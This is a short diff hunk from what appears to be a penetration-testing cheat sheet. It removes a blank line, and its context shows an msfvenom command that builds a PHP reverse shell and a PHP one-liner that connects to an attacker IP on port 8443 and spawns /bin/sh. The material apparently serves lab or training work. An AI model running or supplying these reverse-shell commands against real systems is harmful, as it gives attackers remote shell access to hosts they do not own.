@@ -25,7 +25,6 @@ msfvenom -p php/reverse_php LHOST=tun0 LPORT=8443 -f raw > shell.php
 
 ```php
 php -r '$sock=fsockopen("10.0.0.1",8443);exec("/bin/sh -i <&3 >&3 2>&3");'
-
 ```
 NOTE: Change the `10.0.0.1` parameter to actual Kali attack IP
 
